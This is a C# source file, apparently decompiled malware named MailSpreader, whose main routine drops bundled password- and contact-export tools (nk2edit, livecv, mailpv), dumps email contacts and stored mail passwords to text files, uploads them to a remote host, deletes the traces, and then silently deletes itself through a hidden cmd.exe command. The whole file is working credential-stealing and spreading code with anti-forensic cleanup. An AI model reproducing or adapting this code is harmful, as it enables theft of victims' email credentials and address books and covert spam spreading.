using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;

namespace MailSpreader;

internal class Program
{
	public static string currentLocation = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);

	private static void Main()
	{
		Functions functions = new Functions();
		functions.fixNOIPhosts();
		exportAndUpload(functions, "nk2edit.exe", "ucl.txt");
		exportAndUpload(functions, "livecv.exe", "wlmcl.txt");
		exportAndUpload(functions, "mailpv.exe", "emc.txt", useParameters: true, 15000);
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.Arguments = "/C choice /C Y /N /D Y /T 10 & Del \"" + Assembly.GetExecutingAssembly().Location + "\"";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.FileName = "cmd.exe";
			Process.Start(processStartInfo);
		}
		catch (Exception)
		{
		}
	}

	private static void exportAndUpload(Functions func, string exeName, string outputName, bool useParameters = true, int waitTime = 2000)
	{
		try
		{
			if (!func.dropResource(exeName))
			{
				return;
			}
			Process process = new Process();
			string text = Path.Combine(currentLocation, exeName);
			process.StartInfo.FileName = text;
			if (useParameters)
			{
				process.StartInfo.Arguments = "/stext \"" + currentLocation + "\\" + outputName + "\"";
			}
			process.StartInfo.ErrorDialog = false;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Minimized;
			process.Start();
			process.WaitForExit(20000);
			Thread.Sleep(waitTime);
			string text2 = Path.Combine(currentLocation, outputName);
			FileInfo fileInfo = new FileInfo(text2);
			if (File.Exists(text2))
			{
				if (fileInfo.Length > 20L)
				{
					func.uploadFile(text2);
				}
				File.Delete(text2);
			}
			File.Delete(text);
		}
		catch (Exception)
		{
		}
	}
}
